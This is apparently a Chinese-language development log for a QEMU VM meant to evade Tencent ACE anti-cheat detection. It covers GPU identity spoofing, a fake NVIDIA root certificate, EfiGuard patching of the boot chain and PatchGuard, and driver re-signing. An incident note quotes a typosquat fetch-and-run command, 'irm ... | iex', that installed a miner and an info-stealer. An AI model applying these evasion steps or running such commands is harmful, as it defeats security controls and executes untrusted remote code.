**重新构建 / 复现：** `deploy/tools/build.sh && stop-vm.sh 2 && INSTANCE=2 BRIDGE=br0 STABLE_DISPLAY=1 GPU_SELFSIGNED=1 nohup ./deploy/scripts/start-vm.sh 2 > /tmp/qemu-stealth-2.log 2>&1 &`

### 2026-04-26：ACE 反作弊实测 + "浅层 stealth" 路径定型

**触发事件：** 用户在 VM2（已经过 P0/P1 修复）跑腾讯系游戏，ACE 安全中心弹窗
`检测到系统环境异常 (13-131106-0) 请关闭并卸载可能影响游戏安全的软件`。

**根因：** 不是源码 P0/P1 修补造成的（后者只是删 Red Hat/QEMU 字符串 leak），而是
原 `install-stealth.sh`（深层路径）引入的三个非 WHQL 信号：
1. **EfiGuard 替换 `bootmgfw.efi`** —— 启动链哈希变化 + PatchGuard 被 patch 出局
2. **伪 NVIDIA Code Signing Root** 进 Trusted Root —— 非真实 CA，ACE 黑名单
3. **patched viogpudo.sys** 用伪 NVIDIA Driver Signer 签 —— 非 MS Trusted Publisher

**附属：** 在分诊 ACE 报错时还顺手清掉了一组与本评估无关、但同样触发 ACE 的恶意软件
`C:\Windows\SystemHealth\Update\` 下的 `xmrig-6.26` 矿机 + `getthem` Python info-stealer
+ Litecoin 钱包窃取 + SMB 横向移动模块。来源是用户在装系统后误执行了 typosquat 钓鱼
URL `irm http://get.acivated.win | iex`（少一个 `t`，正版是 `get.activated.win` /
massgrave.dev/get），与本评估的去虚拟化无关；记录在 commit log。

**新增工具：**

| 文件 | 作用 |
|---|---|
| `deploy/scripts/destealth-revert.ps1` | 客机内一键回退：还原 `bootmgfw.efi.original`、删 `EfiGuardDxe.efi`、清 Trusted Root 里的伪 NVIDIA 根、卸 patched viogpudo INF/oem*.inf、删 `C:\stealth\efiguard|nv-driver|driver-signing\`、`bcdedit` 复位 |
| `deploy/scripts/shallow-stealth.ps1` | 客机内浅层 stealth：拉 stock virtio-win 0.1.266 viogpudo（**MS-WHQL 签名**）→ `pnputil /add-driver /install` 绑到 PCI 1AF4:1050 → 跑 `apply-gpu-spoof.ps1` 注册表覆盖（DeviceDesc / FriendlyName / DriverDesc / DEVPKEY → "NVIDIA GeForce GTX 1050"）→ `nvapi64.dll` shim 进 System32 |
| `deploy/scripts/stock-viogpudo/{viogpudo.sys,viogpudo.cat,viogpudo.inf}` | 从 virtio-win.iso 抽出的 w10/amd64 stock 版，通过 host 8765 HTTP 提供给客机 |
| `deploy/autounattend/autounattend.xml` + `autounattend-vm2.iso` | OOBE 自动化 ISO：分区、Administrator/123456、AutoLogon×999、zh-CN、CST 时区、enable RDP（不装 OpenSSH，避免 Add-WindowsCapability 联网卡死） |

**启动器调整（`deploy/scripts/start-vm.sh`）：**

- 重命名 `win10-ryzen3-stealth.sh` → `start-vm.sh`（短）
- `BRIDGE` 默认 `br0`（之前已是，但文档没明确）
- `STABLE_DISPLAY` 默认从 `0` 改为 `1`（virtio-vga，ACE 友好）
- `GPU_SELFSIGNED` 默认仍为 `0`（=浅层路径，ACE 通过；=1 需要深层 + ACE 异常自负）
- 新增 `EXTRA_ISO=` 钩子：副 CDROM 挂 autounattend ISO（OOBE bypass），不污染主 ISO
- `INSTANCE` 用位置参数（`./start-vm.sh 2`），ENV 变量保留兼容但与位置参数冲突时警告
- `CPU_MODEL` 从 ENV 移到 stealth profile，per-instance 持久化（首次默认 `Ryzen3-1200`）

**VM2 上验证（2026-04-26 14:00 起，连续 1 小时游戏未触发 ACE）：**

| 检测项 | 浅层路径下的状态 |
|---|---|
| `bcdedit testsigning` | `No` |
| `Get-PnpDevice -Class Display .Status / .Problem` | `OK / CM_PROB_NONE` |
| `Win32_VideoController.Name` | `NVIDIA GeForce GTX 1050` |
| `Win32_VideoController.AdapterCompatibility` | `NVIDIA` |
| `Win32_VideoController.DriverVersion` | `100.100.104.26600`（stock virtio-win 0.1.266） |
| `viogpudo.sys` Authenticode 签名 | `Microsoft Windows Hardware Compatibility Publisher` |
| `bootmgfw.efi` | 原版（Microsoft 签）—— 无 EfiGuard |
| Trusted Root 中 NVIDIA 相关根证书 | 无 |
| ACE 安全中心 13-131106-0 | 不再触发 |

**结论：** "Q35/ICH9 平台矛盾"在 ACE 类反作弊场景下并未导致 13-131106-0 触发；ACE 在
13 系列环境异常上**首要扫描黑名单驱动 + 启动链完整性 + Trusted Root 异常**，而不是
PCI 拓扑矛盾。这把 P0 #1 的实战优先级降到了 P2（除非要面对内核态/反作弊深查）。
